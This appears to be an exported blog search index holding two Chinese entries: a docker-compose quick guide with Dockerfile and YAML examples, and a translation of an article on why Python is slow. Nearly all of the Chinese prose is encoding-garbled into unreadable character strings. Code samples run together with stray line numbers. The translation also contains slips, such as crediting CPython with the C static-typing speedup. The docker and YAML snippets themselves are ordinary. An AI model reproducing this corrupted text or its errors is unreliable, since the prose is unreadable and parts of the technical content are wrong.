åˆ›å»ºä¸€ä¸ªDockerfileå°±åƒè¿è¡Œä¸€ä¸ªdockeréœ€è¦é•œåƒä¸€æ ·ï¼Œåˆ›å»ºé•œåƒä¹Ÿéœ€è¦ä¸€ä¸ªdockerfileæ¥ç¡®å®šæ€æ ·åˆ›å»ºé•œåƒå’Œå®¹å™¨ã€‚ä¸€ä¸ªRuby on Railsåº”ç”¨ä½¿ç”¨çš„Dockerfileå¯èƒ½æ˜¯è¿™æ ·:1234567FROM ruby:2.3.3 RUN apt-get update -qq &amp;&amp; apt-get install -y build-essential libpq-dev nodejs RUN mkdir /myapp WORKDIR /myapp COPY Gemfile /myapp/Gemfile COPY Gemfile.lock /myapp/Gemfile.lock RUN bundle install COPY . /myapp docker-compose: getting started guide æœ‰ä¸€æ­¥ä¸€æ­¥çš„æŒ‡å¯¼æ•™ä½ åˆ›å»ºdockerfileç„¶åæŠŠdockerfileæ”¹å†™æˆdocker-compose.ymlã€‚ docker-compose.ymlä¹‹æ—…: ç»“æ„å’Œç»„æˆè¦å®šä¹‰ä½ è‡ªå·±çš„å¤šå®¹å™¨åº”ç”¨ï¼Œä½ éœ€è¦åœ¨ä½ çš„åº”ç”¨çš„rootæ–‡ä»¶å¤¹ä½¿ç”¨docker-compose.ymlã€‚compose-fileçš„æ–‡æ¡£æä¾›äº†è¯¦å°½çš„è§£é‡Šå’ŒæŒ‡å¯¼å»ç”Ÿæˆè¿™ä¸ªæ–‡ä»¶ã€‚ ä¸‹é¢æ˜¯ä¸»è¦ç‰¹æ€§çš„å¿«é€Ÿä¸Šæ‰‹æŒ‡å—:æ–‡ä»¶çš„æœ€å¼€å§‹å¼•å…¥ç‰ˆæœ¬: "3"``` 12345ç„¶åå®šä¹‰æœåŠ¡: ```services:``` ä¹‹ååˆ—å‡ºä½ æƒ³è¦åˆ›å»ºçš„æœåŠ¡, æ¯ä¸€ä¸ªå®¹å™¨éƒ½æœ‰å¯¹åº”çš„é…ç½®é¡¹ã€‚ - image - æŒ‡å®šä¸€ä¸ªdockerhubä¸Šæˆ–è€…æœ¬åœ°æœ‰çš„é•œåƒ ```image: ruby:alpine depends_on â€” è¿™ä¸ªå®¹å™¨ä¾èµ–çš„å…¶ä»–å®¹å™¨ï¼Œå¯åŠ¨çˆ¶å®¹å™¨ä¹Ÿä¼šåŒæ—¶å¯åŠ¨çˆ¶å®¹å™¨ä¾èµ–çš„å®¹å™¨ã€‚ 1234567891011version: &apos;3&apos; services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres environment â€” å¢åŠ ç¯å¢ƒå˜é‡. 12345678environment: RACK_ENV: development SHOW: &apos;true&apos; SESSION_SECRET: environment: - RACK_ENV=development - SHOW=true - SESSION_SECRET volumes â€” åŒ…å«å®¿ä¸»æœºçš„è·¯å¾„æˆ–è€…å‘½åå·ã€‚ ä½ å¯ä»¥é€šè¿‡è¿™æ ·çš„æ ¼å¼æ›¿æ¢å®¹å™¨çš„æ•°æ® to file>:``` å¹¶ä¸”å¯ä»¥æŠŠæ–‡ä»¶å¤¹æƒé™æ¥åœ¨åé¢``` :ro``` (read only)12345678910111213141516171819```dockerfileversion: &quot;3.2&quot; services: web: image: nginx:alpine volumes: - type: volume source: mydata target: /data volume: nocopy: true - type: bind source: ./static target: /opt/app/static db: image: postgres:latest volumes: - &quot;/var/run/postgres/postgres.sock:/var/run/postgres/postgres.sock&quot; - &quot;dbdata:/var/lib/postgresql/data&quot; ports â€” å¯ä»¥æŒ‡å®šæ˜ å°„ä¸¤ä¸ªå¯¹åº”çš„ç«¯å£(HOST:CONTAINER), æˆ–è€…åªæŒ‡å®šå®¹å™¨çš„ç«¯å£ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªä¸´æ—¶çš„å¤–éƒ¨ç«¯å£ã€‚ 123456789ports: - "3000" - "3000-3005" - "8000:8000" - "9090-9091:8080-8081" - "49100:22" - "127.0.0.1:8001:8001" - "127.0.0.1:5000-5010:5000-5010" - "6060:6060/udp" Docker Compose åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œè¿˜æœ‰æ›´å¤šç”¨æ³•éœ€è¦å­¦ä¹ ï¼ŒDockeræ–‡æ¡£æœ‰éå¸¸è¯¦å°½çš„è¯´æ˜ï¼Œæœ¬æ–‡åªæ˜¯ç•¥ä½œæŠ›ç –å¼•ç‰ã€‚]]></content>
      <categories>
        <category>éšæ‰‹æ‘˜å½•</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆPython å¦‚æ­¤ä¹‹æ…¢]]></title>
    <url>%2F2019%2F05%2F30%2Fwhy-python-so-slow%2F</url>
    <content type="text"><![CDATA[Python æ­£åœ¨çˆ†ç‚¸èˆ¬æµè¡Œèµ·æ¥ï¼Œå®ƒè¢«ç”¨äºDevOps, æ•°æ®å¤„ç†ï¼Œwebå¼€å‘å’Œå®‰å…¨é¢†åŸŸã€‚ä½†æ˜¯åœ¨é€Ÿåº¦æ–¹é¢å´æ²¡æœ‰å–å¾—è¿‡ä»€ä¹ˆèƒœåˆ©ã€‚ ä¸ºä»€ä¹ˆPythonè¿™ä¹ˆæ…¢å‘¢ï¼Ÿ ä¸ºä»€ä¹ˆPython å¦‚æ­¤ä¹‹æ…¢åŸæ–‡é“¾æ¥: https://hackernoon.com/why-is-python-so-slow-e5074b6fe55b Python æ­£åœ¨çˆ†ç‚¸èˆ¬æµè¡Œèµ·æ¥ï¼Œå®ƒè¢«ç”¨äºDevOps, æ•°æ®å¤„ç†ï¼Œwebå¼€å‘å’Œå®‰å…¨é¢†åŸŸã€‚ä½†æ˜¯åœ¨é€Ÿåº¦æ–¹é¢å´æ²¡æœ‰å–å¾—è¿‡ä»€ä¹ˆèƒœåˆ©ã€‚Javaåœ¨é€Ÿåº¦æ–¹é¢å’ŒC/C++/C#/Pythonæ¯”èµ·æ¥å¦‚ä½•ï¼Ÿç­”æ¡ˆå¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºä½ æ‰€è¿è¡Œçš„åº”ç”¨ã€‚æ²¡æœ‰ä»€ä¹ˆè·‘åˆ†æ˜¯å®Œç¾çš„ï¼Œä½†æ˜¯ç¼–ç¨‹è¯­è¨€æµ‹è¯„æ¸¸æˆ(Computer Language Benchmarks Game)æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åˆ‡å…¥ç‚¹ã€‚ åå¤šå¹´æ¥ç¼–ç¨‹è¯­è¨€æµ‹è¯„æ¸¸æˆä¸€ç›´å¯¹æˆ‘æ¥è¯´æ˜¯ä¸€ä¸ªå‚è€ƒï¼Œç›¸æ¯”äºå…¶ä»–è¯­è¨€ï¼Œæ¯”å¦‚Java, C#, Go, JavaScript, C++, Pythonæ˜¯æœ€æ…¢çš„è¯­è¨€ä¹‹ä¸€ã€‚è¿™äº›è¯­è¨€ä¸­åŒ…å«äº†JITç¼–è¯‘å™¨(c#, java)ï¼ŒAOTç¼–è¯‘å™¨(c/c++)å’Œè§£é‡Šå‹è¯­è¨€jsã€‚ æ³¨æ„: å½“æˆ‘è¯´â€œPythonâ€, æˆ‘è¯´çš„æ˜¯Pythonçš„å‚è€ƒå®ç°CPython, å…¶ä»–å®ç°è¿™ç¯‡æ–‡ç« ä¹Ÿä¼šæåˆ°ã€‚è¿™ç¯‡æ–‡ç« æƒ³è¦å›ç­”çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼šå½“Pythonæ‰§è¡Œä¸€ä¸ªç›¸åŒçš„ç¨‹åºè¦æ¯”åˆ«çš„è¯­è¨€å®ç°æ…¢2-10å€çš„æ—¶å€™ï¼Œä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆæ…¢ï¼Œéš¾é“æˆ‘ä»¬ä¸èƒ½è®©å®ƒè·‘çš„æ›´å¿«å—ï¼Ÿ ä¸‹é¢è¯´ä¸€ä¸‹æœ¬æ–‡çš„ä¸»è¦è§‚ç‚¹(å½“ç„¶ä¹Ÿæ˜¯å®¢è§‚äº‹å®):â€œå› ä¸ºPython æœ‰GIL(Global Interpreter Lock, å…¨å±€è§£é‡Šé”)â€â€œå› ä¸ºPython æ˜¯è§£é‡Šå‹è¯­è¨€è€Œä¸æ˜¯ç¼–è¯‘å‹â€â€œå› ä¸ºPython æ˜¯åŠ¨æ€ç±»å‹è¯­è¨€â€å“ªä¸€ä¸ªåŸå› å½±å“æœ€å¤§å¯¹é€Ÿåº¦å½±å“æœ€å¤§å‘¢ï¼Ÿ GILç°ä»£è®¡ç®—æœºçš„cpuæœ‰å¤šæ ¸ï¼Œæœ‰æ—¶å€™æœ‰å¤šä¸ªå¤„ç†å™¨ã€‚ä¸ºäº†å……åˆ†åˆ©ç”¨å¤šå‡ºæ¥çš„å¤„ç†èƒ½åŠ›ï¼Œæ“ä½œç³»ç»Ÿå®šä¹‰äº†ä¸€ç§æ›´åŠ ä½çº§åˆ«çš„å•ä½:çº¿ç¨‹ï¼Œè®©ä¸€ä¸ªè¿›ç¨‹å¯ä»¥å¯åŠ¨å¤šä¸ªçº¿ç¨‹æ¥æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ã€‚è¿™æ ·çš„è¯å¦‚æœä¸€ä¸ªè¿›ç¨‹çš„CPUèµ„æºéå¸¸ç´§å¼ ï¼Œè´Ÿè½½å°±ä¼šå‡åŒ€çš„å¹³æ‘Šåˆ°å„ä¸ªCPUæ ¸å¿ƒï¼Œè¿™ç§æ–¹æ³•èƒ½å¤Ÿå¾ˆé«˜æ•ˆåœ°è®©å¤§å¤šæ•°ä»»åŠ¡æ›´å¿«å®Œæˆã€‚å½“æˆ‘å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œæˆ‘çš„Chromeæµè§ˆå™¨å¼€å¯äº†44ä¸ªçº¿ç¨‹ã€‚è¦è®°ä½çš„æ˜¯çº¿ç¨‹çš„ç»“æ„å’Œapiåœ¨POSIX-basedçš„ç³»ç»Ÿ(OSX, Linux)å’ŒWindowsä¸‹é¢æ˜¯ä¸ä¸€æ ·çš„ã€‚æ“ä½œç³»ç»ŸåŒæ ·ä¼šç®¡ç†çº¿ç¨‹çš„è°ƒåº¦ã€‚å¦‚æœä½ æ²¡æœ‰è¿›è¡Œè¿‡å¤šçº¿ç¨‹ç¼–ç¨‹ï¼Œä½ éœ€è¦å¿«é€Ÿç†Ÿæ‚‰ä¸€ä¸‹â€é”â€çš„æ¦‚å¿µã€‚ä¸åƒå•çº¿ç¨‹çš„è¿›ç¨‹ï¼Œå¤šçº¿ç¨‹çš„è¿›ç¨‹ä¸­ï¼Œå½“ä½ æ›´æ”¹å†…å­˜ä¸­çš„å˜é‡ï¼Œä½ éœ€è¦ç¡®è®¤å¤šä¸ªçº¿ç¨‹ä¸ä¼šåŒæ—¶å°è¯•è®¿é—®æˆ–ä¿®æ”¹åŒä¸€ä¸ªå†…å­˜å—ã€‚ å½“CPythonåˆ›å»ºå˜é‡ï¼Œå®ƒä¼šç»™å˜é‡åˆ†é…å†…å­˜ç©ºé—´å¹¶ä¸”è®¡ç®—å˜é‡çš„å¼•ç”¨æ•°ï¼Œå¦‚æœå¼•ç”¨æ•°ä¸º0, Pythonå°†ä¼šé‡Šæ”¾æ‰è¿™å—å†…å­˜ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆforå¾ªç¯è¡¨è¾¾å¼é‡Œçš„ä¸´æ—¶å˜é‡ä¸ä¼šè®©å†…å­˜çˆ†ç‚¸ã€‚ä¹Ÿæ˜¯CPythonçš„åƒåœ¾å›æ”¶æœºåˆ¶ã€‚ æ¥ä¸‹æ¥çš„æŒ‘æˆ˜æ˜¯ï¼Œå½“å˜é‡è¢«å¤šä¸ªçº¿ç¨‹å…±äº«æ—¶ï¼Œå¦‚ä½•é”ä½å¼•ç”¨æ•°ã€‚Pythonç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰ä¸€ä¸ªå…¨å±€è§£é‡Šé”GIL å°å¿ƒåœ°æ§åˆ¶ç€çº¿ç¨‹çš„æ‰§è¡Œã€‚Pythonè§£é‡Šå™¨åœ¨åŒä¸€æ—¶é—´åªèƒ½æ‰§è¡Œä¸€ä¸ªæ“ä½œï¼Œä¸è®ºæœ‰å¤šå°‘ä¸ªçº¿ç¨‹ã€‚ è¿™å¯¹äºPythonåº”ç”¨çš„æ€§èƒ½è¡¨ç°æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿå¦‚æœä½ çš„åº”ç”¨æ˜¯å•çº¿ç¨‹å•è§£é‡Šå™¨çš„ï¼Œè¿™å¯¹ä½ çš„åº”ç”¨æ€§èƒ½æ¯«æ— å½±å“ã€‚ç§»é™¤GILä¹Ÿä¸ä¼šå¯¹ä½ çš„åº”ç”¨æ€§èƒ½æœ‰ä»»ä½•å½±å“ã€‚å¦‚æœä½ æƒ³åœ¨åŒä¸€ä¸ªè§£é‡Šå™¨ä¸­ä½¿ç”¨çº¿ç¨‹è¿›è¡Œå¹¶å‘æ“ä½œï¼Œå¹¶ä¸”ä½ çš„çº¿ç¨‹æ˜¯IOå¯†é›†å‹çš„ï¼Œé‚£ä½ å°±ä¼šçœ‹åˆ°GILçš„èµ„æºäº‰å¤ºã€‚ David Beazleyçš„åšå®¢ä¸­å¯¹å¤šçº¿ç¨‹ç¨‹åºä¸­ GIL çš„ä½œç”¨è¿›è¡Œäº†å¯è§†åŒ–:http://dabeaz.blogspot.com/2010/01/python-gil-visualized.html ä¸‹å›¾è¡¨ç¤ºäº†Pythonå¤šçº¿ç¨‹ç¨‹åºä¸­GILçš„åˆ†é…æƒ…å†µã€‚ å¦‚æœä¸€ä¸ªPythonç¨‹åºé‡Œæœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªç¨‹åºè¿è¡Œçš„æ—¶å€™ä¼šæ‹¿ç€GILï¼Œå½“é‡åˆ°I/Oçš„æ—¶å€™ä¼šæ”¾å¼€GILï¼Œä½†æ˜¯CPU-boundçš„çº¿ç¨‹é€šå¸¸ä¸ä¼šè¿›è¡ŒI/Oã€‚Pythonåˆ‡æ¢çº¿ç¨‹çš„ä¸€ç§ä½œæ³•æ˜¯æ¯100 ticksæ£€æŸ¥ä¸€ä¸‹ï¼Œå¯ä»¥é€šè¿‡sys.setcheckinterval()ä¿®æ”¹è¿™ä¸ªæ•°å€¼ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå› ä¸ºPythonçº¿ç¨‹ä¸èƒ½æœ‰æ•ˆåˆ©ç”¨å¤šæ ¸ï¼Œä½†æ˜¯å¢åŠ äº†CPU context switchçš„æ¶ˆè€—ï¼Œæ‰€ä»¥å¯¹äºCPU-boundçš„ç¨‹åºè¡¨ç°å¾ˆå·®ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œåœ¨å¤šæ ¸æƒ…å†µä¸‹å¯èƒ½è¡¨ç°ä¼šæ›´å·®ï¼Œå› ä¸ºç³»ç»Ÿæ”¯æŒå¤šçº¿ç¨‹è¿è¡Œä½†æ˜¯GILä¿è¯åªæœ‰ä¸€ä¸ªçº¿ç¨‹è¿è¡Œï¼Œè¿™æ—¶å€™å¤šçº¿ç¨‹ä¼šåå¤çš„æ£€æŸ¥GILæ˜¯å¦è¢«é‡Šæ”¾ï¼Œä½†æ˜¯æ‹¿ä¸åˆ°GIL(å› ä¸ºæœ‰å¤ªå¤šçº¿ç¨‹ç«äº‰)ï¼Œæœ‰å¯èƒ½å¯¼è‡´ç³»ç»Ÿå‘ç”ŸTrashingç°è±¡ã€‚ å¦‚æœä½ ä½¿ç”¨ä¸€ä¸ªwebåº”ç”¨(Django)å¹¶ä¸”ä½¿ç”¨WSGIï¼Œæ¯ä¸ªè¯·æ±‚ä¼šæœ‰ä¸€ä¸ªå•ç‹¬çš„Pythonè§£é‡Šå™¨ï¼Œç”±äºPythonçš„å…¨å±€è§£é‡Šé”å¯åŠ¨å¾ˆæ…¢ï¼Œæ‰€ä»¥æœ‰çš„WSGIå®ç°ä¼šæœ‰ä¸€ä¸ªâ€œå®ˆæŠ¤æ¨¡å¼â€ï¼Œå°±æ˜¯å…ˆæŠŠPythonè¿›ç¨‹å¯åŠ¨èµ·æ¥æ”¾ç€ï¼Œç­‰å¾…è¯·æ±‚è¿›æ¥ä½¿ç”¨ã€‚ é‚£å…¶ä»–çš„Pythonå®ç°å‘¢ï¼ŸPyPyä¹Ÿæœ‰GILä½†æ˜¯æ¯”CPythonå¿«è¶…è¿‡ä¸‰å€ã€‚JPython æ²¡æœ‰GIL, å› ä¸ºJPythonçš„çº¿ç¨‹ä»£è¡¨ä¸€ä¸ªJavaçº¿ç¨‹ï¼Œå¾—ç›ŠäºJVMçš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒJPythonä¸ä½¿ç”¨GILã€‚ JavaScriptæ˜¯æ€ä¹ˆåšçš„å‘¢é¦–å…ˆæ‰€æœ‰çš„Javascript å¼•æ“ä½¿ç”¨æ ‡è®°-æ¸…é™¤çš„åƒåœ¾å›æ”¶æœºåˆ¶ã€‚ ä¸Šé¢æåˆ°è¿‡ï¼Œ GILçš„éœ€æ±‚ä¸»è¦æ˜¯å› ä¸ºCPythonçš„å†…å­˜ç®¡ç†ç®—æ³•ã€‚JavaScript æ²¡æœ‰GIL, ä½†å®ƒåŒæ—¶ä¹Ÿæ˜¯å•çº¿ç¨‹çš„æ‰€ä»¥å®ƒå¹¶ä¸éœ€è¦GILã€‚JavaScriptä½¿ç”¨äº‹ä»¶å¾ªç¯å’ŒPromise/Callbackå®ç°å¼‚æ­¥çš„ç¼–ç¨‹è€Œä¸æ˜¯ä½¿ç”¨å¹¶å‘ã€‚Pythonä¹Ÿæœ‰ç±»ä¼¼å®ç°asyncio â€œå› ä¸ºPythonæ˜¯è§£é‡Šå‹è¯­è¨€â€æˆ‘ç»å¸¸å¬è¯´è¿™ä¸ªè¨€è®ºï¼Œæˆ‘è§‰å¾—è¿™æ˜¯ä¸€ä¸ªå¯¹äºCPythonæ‰§è¡Œæ–¹å¼çš„ç²—æš´ç®€åŒ–ã€‚å¦‚æœä½ åœ¨ç»ˆç«¯æ‰§è¡Œä¸€ä¸ªå‘½ä»¤(æ¯”å¦‚python myscript.py)ï¼ŒCPythonä¼šå¼€å§‹é¡ºåºæ‰§è¡Œä¸€å¤§ä¸²ä»»åŠ¡: è¯»å–ï¼Œè¯æ³•åˆ†æï¼Œè§£æï¼Œç¼–è¯‘ï¼Œè§£é‡Šï¼Œæ‰§è¡Œä»£ç ã€‚ ä¸€ä¸ªé‡ç‚¹æ˜¯.pycæ–‡ä»¶çš„åˆ›å»ºã€‚åœ¨ç¼–è¯‘é˜¶æ®µï¼Œå­—èŠ‚ç ä¸²è¢«å†™åˆ°pycache/ä¸‹(3.x)æˆ–è€…å’Œpyæ–‡ä»¶ç›¸åŒçš„æ–‡ä»¶å¤¹(2.x)ã€‚è¿™ä¸ªæ“ä½œä¸ä»…å¯¹ä½ è‡ªå·±çš„ä»£ç æœ‰æ•ˆï¼Œä¹ŸåŒ…æ‹¬æ‰€æœ‰ä½ å¯¼å…¥çš„æ¨¡å—ã€‚ æ‰€ä»¥å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒPythonåœ¨æœ¬åœ°è§£é‡Šå’Œæ‰§è¡Œå­—èŠ‚ç ï¼Œä¸ä¹‹ç›¸æ¯” Java å’Œ C#.NET:Java ç¼–è¯‘æˆä¸€ä¸ªâ€œä¸­é—´è¯­è¨€â€ï¼Œç„¶åJVMè¯»å­—èŠ‚ç å®æ—¶å°†å…¶è½¬åŒ–ä¸ºæœºå™¨ç ï¼Œ.NETçš„CILä¹Ÿä¸€æ ·ï¼Œ.NET CLR(Common-Language-Runtime, é€šç”¨è¯­è¨€è¿è¡Œæ—¶)ï¼Œä½¿ç”¨çš„æ˜¯å®æ—¶ç¼–è¯‘åˆ°æœºå™¨ç (JIT)ã€‚ æ‰€ä»¥ï¼Œå¦‚æœå®ƒä»¬éƒ½ç”¨åˆ°äº†è™šæ‹Ÿæœºå’Œéƒ¨åˆ†å­—èŠ‚ç ï¼Œä¸ºä»€ä¹ˆPythonåœ¨è·‘åˆ†ä¸Šæ¯”Java/C#æ…¢è¿™ä¹ˆå¤šå‘¢?Java/C# æ˜¯å³æ—¶ç¼–è¯‘(JIT)çš„ã€‚JITè¦æ±‚ä¸€ä¸ªä¸­é—´è¯­è¨€ï¼Œä»¥ä¾¿è®©ä»£ç è½¬æ¢æˆåŒºå—ã€‚AOTç¼–è¯‘æ˜¯ä¸ºäº†å¯ä»¥åœ¨äº¤äº’å‰ä¿è¯CPUèƒ½ç†è§£æ¯ä¸€è¡Œä»£ç ã€‚JITæœ¬èº«ä¸ä¼šè®©æ‰§è¡Œé€Ÿåº¦æ›´å¿«ï¼Œä»¥ä¸ºå®ƒä»ç„¶æ˜¯åœ¨æ‰§è¡Œç›¸åŒçš„å­—èŠ‚ç ï¼Œ ç„¶è€ŒJITå¯ä»¥è®©å®æ—¶ä¼˜åŒ–æˆä¸ºå¯èƒ½ï¼Œä¸€ä¸ªå¥½çš„JITç¼–è¯‘å™¨åº”ç”¨çš„é‚£ä¸€éƒ¨åˆ†è¢«æ‰§è¡Œå¾ˆå¤šæ¬¡ï¼Œè¿™äº›éƒ¨åˆ†è¢«ç§°ä¸ºâ€œçƒ­ç‚¹â€ã€‚è¿™æ ·ç¼–è¯‘å™¨ä¼šå°†è¿™äº›éƒ¨åˆ†æ›¿æ¢æˆæ›´åŠ é«˜æ•ˆçš„ç‰ˆæœ¬ã€‚è¿™æ„å‘³ç€å¦‚æœä½ çš„ç¨‹åºé‡å¤åšç›¸åŒçš„äº‹æƒ…ï¼Œä½¿ç”¨JITå°±èƒ½æ˜¾è‘—æé«˜é€Ÿåº¦ã€‚åŒæ—¶Java/C#æ˜¯å¼ºç±»å‹çš„è¯­è¨€æ‰€ä»¥ä¼˜åŒ–å™¨å¯ä»¥å¯¹è¯­è¨€ä½œå‡ºæ›´å¤šé¢„è®¾ã€‚ PyPy ä½¿ç”¨JITï¼Œå‰é¢æåˆ°ï¼Œå®ƒæ¯”CPythonå¿«å¾—å¤šã€‚ æ‰€ä»¥ä¸ºä»€ä¹ˆCPythonä¸ç”¨JITå‘¢JITæœ‰å¾ˆå¤šç¼ºç‚¹ï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯å¯åŠ¨æ…¢ã€‚CPython å¯åŠ¨å·²ç»ç›¸å¯¹å¾ˆæ…¢äº†, PyPyæ¯”CPythonå¯åŠ¨æ…¢CPython2-3å€ã€‚JVMå¯åŠ¨æ˜¯å‡ºäº†åçš„æ…¢ã€‚.NET CLRä½¿ç”¨éšæ“ä½œç³»ç»Ÿå¯åŠ¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜, ä½†CLRçš„å¼€å‘è€…åŒæ—¶ä¹Ÿæ˜¯å…¶ä¾èµ–çš„ç³»ç»Ÿçš„å¼€å‘è€…(win)ã€‚å¦‚æœä½ çš„Pythonæ˜¯å•è¿›ç¨‹ï¼Œè¿è¡Œæ—¶é—´å¾ˆé•¿ï¼Œå¹¶ä¸”æœ‰å¾ˆå¤šé‡å¤æ“ä½œå¯ä»¥è¢«ä¼˜åŒ–ï¼Œé‚£ä¹ˆä½¿ç”¨JITå°±å¾ˆæœ‰æ„ä¹‰ã€‚ä½†æ˜¯CPythonæ˜¯é€šç”¨å®ç°ï¼Œå½“ä½¿ç”¨Pythonå¼€å‘å‘½ä»¤è¡Œå·¥å…·ï¼Œæ¯æ¬¡éƒ½ç­‰å¾…JITå¯åŠ¨æ˜¯éå¸¸ç³Ÿç³•çš„ä½“éªŒã€‚CPythonéœ€è¦æœåŠ¡äºå°½å¯èƒ½å¹¿æ³›çš„åœºæ™¯ï¼Œæœ‰å¯èƒ½ä½¿ç”¨JITåè€Œä¼šå¤§å¹…åº¦æ‹–ç´¯ç³»ç»Ÿæ€§èƒ½ã€‚å¦‚æœä½ éœ€è¦ä½¿ç”¨JITå¹¶ä¸”æœ‰ä¸€ä¸ªé€‚åˆçš„å·¥ä½œåœºæ™¯ï¼Œé‚£å¯ä»¥ä½¿ç”¨PyPyã€‚ â€œå› ä¸ºPythonæ˜¯åŠ¨æ€ç±»å‹è¯­è¨€â€åœ¨é™æ€ç±»å‹è¯­è¨€ä¸­ï¼Œå£°æ˜å˜é‡ä¹‹å‰éœ€è¦å£°æ˜å˜é‡ç±»å‹ï¼ŒåŒ…æ‹¬ C, C++, Java, C#, Goã€‚åŠ¨æ€ç±»å‹è¯­è¨€ä¸­ä»ç„¶æœ‰ç±»å‹çš„æ¦‚å¿µï¼Œä½†æ˜¯å˜é‡çš„ç±»å‹å¯å˜ã€‚ 12a = 1a = "foo" è¿™ä¸ªå°ä¾‹å­ä¸­, Python ä½¿ç”¨ç›¸åŒçš„å˜é‡ååˆ›å»ºäº†ç±»å‹ä¸åŒçš„ç¬¬äºŒä¸ªå˜é‡ï¼Œé‡Šæ”¾æ‰äº†ç¬¬ä¸€ä¸ªå˜é‡çš„å†…å­˜ç©ºé—´ã€‚é™æ€ç±»å‹è¯­è¨€å¹¶ä¸æ˜¯ä¸ºäº†éº»çƒ¦ä½ è€Œè®¾è®¡çš„ï¼Œè€Œæ˜¯æ ¹æ®CPUè¡Œä¸ºè®¾è®¡çš„ã€‚å¦‚æœæ‰€æœ‰çš„è¡Œä¸ºæœ€ç»ˆä¼šå˜æˆäºŒè¿›åˆ¶æ“ä½œï¼Œä½ å¿…é¡»å°†å¯¹è±¡è½¬æ¢æˆæ›´åŠ åº•å±‚çš„æ•°æ®ç»“æ„ã€‚ Pythonä¸ºä½ ä»£åŠ³äº†è½¬æ¢åˆ°åº•å±‚æ•°æ®ç»“æ„è¿™ä¸€æ­¥ï¼Œæ‰€ä»¥ä½ ä¸ç”¨å…³å¿ƒã€‚å½“ç„¶ä¸ç”¨å£°æ˜å˜é‡å¹¶ä¸æ˜¯Pythonæ…¢çš„åŸå› ã€‚Pythonè¯­è¨€çš„è®¾è®¡æä¸ºçµæ´»ï¼Œå‡ ä¹æ‰€æœ‰ä¸œè¥¿éƒ½èƒ½å˜æˆåŠ¨æ€çš„ï¼Œæ¯”å¦‚çŒ´å­è¡¥ä¸ã€‚è¿™ç§è®¾è®¡è®©Pythonçš„ä¼˜åŒ–å˜å¾—éš¾ä»¥æƒ³è±¡çš„å›°éš¾ã€‚ çŒ´å­è¡¥ä¸: åœ¨è¿è¡Œæ—¶æ›¿æ¢æ–¹æ³•ã€å±æ€§ç­‰ åœ¨ä¸ä¿®æ”¹ç¬¬ä¸‰æ–¹ä»£ç çš„æƒ…å†µä¸‹å¢åŠ åŸæ¥ä¸æ”¯æŒçš„åŠŸèƒ½ åœ¨è¿è¡Œæ—¶ä¸ºå†…å­˜ä¸­çš„å¯¹è±¡å¢åŠ patchè€Œä¸æ˜¯åœ¨ç£ç›˜çš„æºä»£ç ä¸­å¢åŠ  pythonä¸­ä¸€ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼š 1import simplejson as json æ‰€ä»¥æ˜¯Pythonçš„åŠ¨æ€æ€§è®©å®ƒå¦‚æ­¤æ…¢å—ï¼Ÿæ¯”è¾ƒå’Œè½¬æ¢ç±»å‹éå¸¸è€—è´¹èµ„æº, æ¯æ¬¡å¯¹å˜é‡è¯»å†™ã€å¼•ç”¨éƒ½éœ€è¦æ£€æŸ¥ç±»å‹ã€‚å¦‚æ­¤åŠ¨æ€åŒ–çš„è¯­è¨€æ˜¯å¾ˆéš¾ä¼˜åŒ–çš„ï¼Œå¾ˆå¤šPythonçš„ä¸åŒå®ç°èƒ½æ›´å¿«æ˜¯å› ä¸ºä¸ºäº†æ€§èƒ½åœ¨çµæ´»æ€§æ–¹é¢åšäº†å¦¥åã€‚ æ¯”å¦‚CPython, å°†Cè¯­è¨€çš„é™æ€ç±»å‹å’ŒPythonç»“åˆï¼Œè¿™äº›é™æ€ç±»å‹èƒ½æä¾›84å€çš„æ€§èƒ½ä¼˜åŒ–ã€‚ ç»“è®ºPythonè¿™ä¹ˆæ…¢ä¸»è¦æ˜¯å› ä¸ºåŠ¨æ€çš„ç”Ÿæ€å’Œå®ƒçš„å¤šåŠŸèƒ½æ€§ã€‚å®ƒèƒ½ç”¨æ¥è§£å†³æ‰€æœ‰ç±»å‹çš„é—®é¢˜ï¼Œæ‰€ä»¥åœ¨ä¸åŒé¢†åŸŸæˆ‘ä»¬å¯ä»¥é€‰æ‹©æ›´åŠ å¿«é€Ÿçš„Pythonç‰ˆæœ¬ã€‚æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥ç”¨æ¥ä¼˜åŒ–ä½ çš„Pythonç¨‹åºï¼Œæ¯”å¦‚æ´»ç”¨async, äº†è§£åˆ†æå·¥å…·, è€ƒè™‘ä½¿ç”¨å¤šä¸ªè§£é‡Šå™¨ç­‰ç­‰ã€‚æ¯”å¦‚ä¸€äº›å¯åŠ¨æ—¶é—´ä¸é‡è¦çš„åº”ç”¨ï¼Œæˆ–è€…èƒ½å¤Ÿèƒ½JITè·ç›Šçš„ç¨‹åºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨PyPyã€‚å¦‚æœä½ çš„ä»£ç æœ‰äº›éƒ¨åˆ†éå¸¸è¦æ±‚æ€§èƒ½ï¼Œåˆä½¿ç”¨äº†å¾ˆå¤šCè¯­è¨€çš„é™æ€ç±»å‹ï¼Œé‚£ä¹ˆé€‰æ‹©Cythonã€‚]]></content>
      <categories>
        <category>éšæ‰‹æ‘˜å½•</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>GIL</tag>
